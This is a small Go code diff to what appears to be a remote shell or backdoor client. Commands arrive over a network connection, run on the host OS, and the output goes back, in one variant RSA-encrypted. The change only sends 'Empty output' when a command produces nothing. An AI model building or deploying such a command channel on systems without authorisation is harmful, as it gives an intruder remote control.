@@ -44,7 +44,7 @@ func Handler(conn net.Conn, OS_info string, conn_update <-chan *net.Conn) {
 		var output string = Execute_on_OS(OS_info, command)
 		var formatted_output string = strings.TrimSpace(output)
 		if len(formatted_output) == 0 {
-			continue
+			formatted_output = "Empty output"
 		}
 		_, err = updated_conn.Write([]byte(formatted_output))
 
@@ -113,7 +113,7 @@ func Handler_RSA(conn net.Conn, OS_info string, private_key string, public_key s
 		var output string = Execute_on_OS(OS_info, command)
 		var formatted_output string = strings.TrimSpace(output)
 		if len(formatted_output) == 0 {
-			continue
+			formatted_output = "Empty output"
 		}
 
 		// Encrypt and send the output back to the client
